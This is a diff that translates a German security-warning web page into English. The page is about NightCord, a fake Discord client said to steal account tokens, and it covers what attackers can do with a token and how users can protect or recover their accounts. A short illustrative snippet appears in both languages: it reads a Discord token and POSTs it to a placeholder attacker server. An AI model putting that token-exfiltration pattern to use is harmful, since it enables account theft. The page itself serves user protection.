@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NightCord – Fake Vencord mit Token-Logger | Sicherheitswarnung | Disc-Tools</title>
-    <meta name="description" content="NightCord ist ein gefälschter Vencord-Client, der Discord-Token stiehlt. Das GitHub-Repo wurde entfernt, aber alte Versionen sind noch im Umlauf.">
+    <title>NightCord – Fake Vencord with Token Logger | Security Warning | Disc-Tools</title>
+    <meta name="description" content="NightCord is a fake Discord client that steals your token. The GitHub repo was taken down, but old versions are still being spread.">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link rel="icon" type="image/png" href="/assets/img/logo.png">
     <link rel="stylesheet" href="/css/style.css?v=2">
@@ -13,13 +13,13 @@
 
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://disc-tools.de/security-articles/nightcord/">
-    <meta property="og:title" content="NightCord – Fake Vencord mit Token-Logger | Sicherheitswarnung">
-    <meta property="og:description" content="NightCord ist ein gefälschter Discord-Client, der Token stiehlt. So erkennst du ihn und schützt dich.">
+    <meta property="og:title" content="NightCord – Fake Vencord with Token Logger | Security Warning">
+    <meta property="og:description" content="NightCord is a fake Discord client that steals your token. How to recognize it and protect yourself.">
 
     <meta property="twitter:card" content="summary_large_image">
     <meta property="twitter:url" content="https://disc-tools.de/security-articles/nightcord/">
-    <meta property="twitter:title" content="NightCord – Fake Vencord mit Token-Logger | Sicherheitswarnung">
-    <meta property="twitter:description" content="NightCord ist ein gefälschter Discord-Client, der Token stiehlt. So erkennst du ihn und schützt dich.">
+    <meta property="twitter:title" content="NightCord – Fake Vencord with Token Logger | Security Warning">
+    <meta property="twitter:description" content="NightCord is a fake Discord client that steals your token. How to recognize it and protect yourself.">
     <meta property="og:image" content="https://disc-tools.de/assets/img/logo.png">
     <meta property="og:image:width" content="64">
     <meta property="og:image:height" content="64">
@@ -99,78 +99,78 @@
         <span>/</span>
         <a href="/security-articles/">Security Articles</a>
         <span>/</span>
-        <a href="/security-articles/nightcord/" class="current">NightCord Warnung</a>
+        <a href="/security-articles/nightcord/" class="current">NightCord Warning</a>
     </nav>
 
     <main class="guide-page">
         <section class="guide-hero">
-            <h1><em>NightCord</em> – Gefälschter Discord-Client mit Token-Logger</h1>
-            <p>Ein Vencord-Fork, der verspricht, dein Discord-Erlebnis zu verbessern – und dabei deinen Account stiehlt.</p>
+            <h1><em>NightCord</em> – Fake Discord Client with Token Logger</h1>
+            <p>A Vencord fork that promises to enhance your Discord experience – while stealing your account.</p>
         </section>
 
         <div class="guide-content">
             <div class="warning-box">
-                <strong>Warnung</strong>
-                <p>NightCord ist kein sicherer Discord-Client. Wer ihn installiert, riskiert den vollständigen Verlust seines Discord-Kontos. Das originale GitHub-Repository wurde nach massiven Hinweisen auf Token-Diebstahl entfernt. Die Entwickler streiten alles ab, aber alte Versionen beweisen den Schadcode eindrucksvoll.</p>
+                <strong>Warning</strong>
+                <p>NightCord is NOT a safe Discord client. Installing it puts your Discord account at risk of being stolen. The original GitHub repository was taken down after substantial evidence of token theft was uncovered. The developers deny everything, but old versions of the code prove the malicious intent beyond doubt.</p>
             </div>
 
-            <h2>Was ist NightCord?</h2>
-            <p><strong>NightCord</strong> gab sich als verbesserter Discord-Client aus – ähnlich wie <a href="https://vencord.dev" target="_blank" rel="noopener">Vencord</a> oder BetterDiscord. Es wurde als optisch aufgewertete Alternative mit zusätzlichen Funktionen beworben. In Wirklichkeit handelte es sich um eine getarnte Schadsoftware, die darauf ausgelegt war, Discord-Token zu stehlen.</p>
+            <h2>What Is NightCord?</h2>
+            <p><strong>NightCord</strong> posed as an enhanced Discord client — similar to <a href="https://vencord.dev" target="_blank" rel="noopener">Vencord</a> or BetterDiscord. It was advertised as a visually upgraded alternative with extra features. In reality, it was disguised malware designed to steal Discord tokens.</p>
 
-            <p>Das GitHub-Repository und sehr wahrscheinlich auch die zugehörige Website wurden inzwischen entfernt. Dennoch kursieren alte Versionen weiterhin in Discord-Servern, Foren und über Direktnachrichten.</p>
+            <p>The GitHub repository — and most likely the associated website — have been taken down. However, old versions are still circulating through Discord servers, forums, and direct messages.</p>
 
-            <h2>Wie funktioniert der Token-Diebstahl?</h2>
-            <p>NightCord enthielt versteckten Code, der beim Start des Clients automatisch ausgeführt wurde:</p>
+            <h2>How the Token Theft Works</h2>
+            <p>NightCord contained hidden code that executed automatically when the client started:</p>
             <ol>
-                <li>Der Client liest die Discord-Token-Datei aus dem lokalen Speicher des Benutzers aus</li>
-                <li>Der Token wird an einen Server der Angreifer gesendet (via Webhook oder HTTP-Request)</li>
-                <li>Die Angreifer haben nun vollen Zugriff auf das Discord-Konto</li>
+                <li>The client reads the Discord token file from the user's local storage</li>
+                <li>The token is sent to the attacker's server (via webhook or HTTP request)</li>
+                <li>The attackers now have full access to the Discord account</li>
             </ol>
 
-            <p>Das Besondere: Der Schadcode war gut in der Codebasis versteckt – in alten Versionen (die noch kursieren) ist er klar als Token-Logger zu identifizieren.</p>
+            <p>The malicious code was well hidden in the codebase — but in older versions (still being spread), it is clearly identifiable as a token logger.</p>
 
             <div class="code-block">
-                <pre><code>// Vereinfachte Darstellung des Schadmusters, das in NightCord gefunden wurde
+                <pre><code>// Simplified representation of the malicious pattern found in NightCord
 const token = DiscordNative.nativeModules.require('process').env.DISCORD_TOKEN;
-fetch('https://angreifer-server/steal', { method: 'POST', body: JSON.stringify({ token }) });</code></pre>
+fetch('https://attacker-server/steal', { method: 'POST', body: JSON.stringify({ token }) });</code></pre>
             </div>
 
-            <h2>Was können Angreifer mit deinem Token tun?</h2>
-            <p>Ein Discord-Token ist der <strong>komplette Schlüssel zu deinem Account</strong>. Mit einem Token können Angreifer:</p>
+            <h2>What Can Attackers Do With Your Token?</h2>
+            <p>A Discord token is the <strong>complete key to your account</strong>. With a token, attackers can:</p>
 
             <ul>
-                <li><strong>Vollständigen Account-Zugriff erhalten</strong> – Sie können sich als dich ausgeben, ohne Passwort oder 2FA. Discord fragt nicht nochmal nach.</li>
-                <li><strong>Private Nachrichten lesen</strong> – Alle DMs, Gruppenchats und Server-Nachrichten sind einsehbar.</li>
-                <li><strong>Nachrichten in deinem Namen senden</strong> – Sie können Spam, Betrug oder Schadlinks an deine Freunde und Kontakte senden, was den Schaden weiter vergrößert.</li>
-                <li><strong>Server beitreten oder verlassen</strong> – Dein Account kann in Server eingeladen werden oder vorhandene Server verlassen.</li>
-                <li><strong>Administrative Aktionen ausführen</strong> – Wenn du Admin-Rechte in einem Server hast, können die Angreifer Mitglieder bannen, Nachrichten löschen, Kanäle umbenennen und den Server sabotieren.</li>
-                <li><strong>Zahlungsmethoden einsehen</strong> – Falls du Discord Nitro oder andere Käufe getätigt hast, können hinterlegte Zahlungsinformationen (PayPal, Kreditkarte) ausgelesen werden.</li>
-                <li><strong>Sitzungen aufrechterhalten</strong> – Selbst wenn du dein Passwort änderst, bleibt der gestohlene Token gültig, bis du alle Sitzungen in den Discord-Einstellungen unter "Log Out All Known Devices" beendest.</li>
+                <li><strong>Gain full account access</strong> — They can impersonate you without needing your password or 2FA. Discord does not prompt for re-authentication.</li>
+                <li><strong>Read private messages</strong> — All DMs, group chats, and server messages are visible.</li>
+                <li><strong>Send messages as you</strong> — They can send spam, scams, or malicious links to your friends and contacts, spreading the attack further.</li>
+                <li><strong>Join or leave servers</strong> — Your account can be invited to servers or leave existing ones.</li>
+                <li><strong>Perform administrative actions</strong> — If you have admin permissions on a server, attackers can ban members, delete messages, rename channels, and sabotage the server.</li>
+                <li><strong>View payment methods</strong> — If you have Discord Nitro or made purchases, stored payment information (PayPal, credit card) can be accessed.</li>
+                <li><strong>Maintain persistent access</strong> — Even if you change your password, the stolen token remains valid until you log out all sessions under Discord settings → "Log Out All Known Devices".</li>
             </ul>
 
-            <h2>So schützt du dich</h2>
+            <h2>How to Protect Yourself</h2>
             <ul>
-                <li><strong>Installiere keine modifizierten Discord-Clients</strong> aus nicht vertrauenswürdigen Quellen. Nutze ausschließlich die offizielle Discord-App oder bekannte Open-Source-Clients wie Vencord, die von der Community geprüft werden.</li>
-                <li><strong>Prüfe vor der Installation immer den Quellcode</strong> Wenn ein Client behauptet, "closed source" zu sein, ist das ein massives Warnsignal bei Sicherheitssoftware.</li>
-                <li><strong>Verwende Discord im Browser</strong> für unbekannte oder riskante Clients – der Browser isoliert die Sitzung besser als die Desktop-App.</li>
-                <li><strong>Aktualisiere regelmäßig dein Passwort</strong> und nutze die Funktion "Alle bekannten Geräte abmelden" in den Discord-Sicherheitseinstellungen.</li>
-                <li><strong>Aktiviere 2FA</strong> Zwar schützt 2FA nicht vor Token-Diebstahl, aber es erschwert Angreifern den Zugriff auf dein Konto über andere Wege.</li>
+                <li><strong>Never install modified Discord clients</strong> from untrustworthy sources. Only use the official Discord app or well-known open-source clients like Vencord that are audited by the community.</li>
+                <li><strong>Always check the source code</strong> before installing anything. If a client claims to be "closed source," that is a massive red flag for security software.</li>
+                <li><strong>Use Discord in your browser</strong> for unknown or risky clients — the browser isolates sessions better than the desktop app.</li>
+                <li><strong>Regularly update your password</strong> and use the "Log Out All Known Devices" option in Discord's security settings.</li>
+                <li><strong>Enable 2FA</strong> While 2FA does not protect against token theft, it makes it harder for attackers to access your account through other means.</li>
             </ul>
 
-            <h2>Wurde ich bereits getroffen?</h2>
-            <p>Wenn du NightCord jemals installiert hast, gehe davon aus, dass dein Token kompromittiert ist. Folge diesen Schritten sofort:</p>
+            <h2>Have I Been Compromised?</h2>
+            <p>If you have ever installed NightCord, assume your token has been compromised. Follow these steps immediately:</p>
             <ol>
-                <li>Öffne Discord → Benutzereinstellungen → "Mein Konto"</li>
-                <li>Klicke auf "Passwort ändern" – das invalidiert deinen aktuellen Token</li>
-                <li>Gehe zu "Geräte" und klicke auf "Alle bekannten Geräte abmelden"</li>
-                <li>Ändere auch dein E-Mail-Passwort, falls es identisch war</li>
-                <li>Überprüfe deine verbundenen Apps unter "Autorisierte Apps" und entferne alles Unbekannte</li>
+                <li>Open Discord → User Settings → "My Account"</li>
+                <li>Click "Change Password" — this invalidates your current token</li>
+                <li>Go to "Devices" and click "Log Out All Known Devices"</li>
+                <li>Also change your email password if it was the same</li>
+                <li>Review your authorized apps under "Authorized Apps" and remove anything unknown</li>
             </ol>
 
-            <h2>Fazit</h2>
-            <p>NightCord ist ein weiteres Beispiel dafür, wie getarnte Schadsoftware in der Discord-Community verbreitet wird. Die Entwickler streiten die Vorwürfe ab, obwohl alte Versionen den Token-Diebstahl eindeutig belegen. Das Repository ist zurecht entfernt. Aber alte Versionen sind noch im Umlauf – installiere NightCord unter keinen Umständen.</p>
+            <h2>Conclusion</h2>
+            <p>NightCord is yet another example of disguised malware spreading through the Discord community. The developers deny the allegations, even though old versions clearly prove the token theft. The repository was rightfully removed. But old versions are still in circulation — do not install NightCord under any circumstances.</p>
 
-            <p>Bleib wachsam und hinterfrage jeden "verbesserten" Client, der dir in Discord-Servern oder DMs angeboten wird. Wenn etwas zu gut aussieht, um wahr zu sein, ist es das meistens auch.</p>
+            <p>Stay vigilant and question any "enhanced" client offered to you in Discord servers or DMs. If something looks too good to be true, it most likely is.</p>
         </div>
     </main>
 
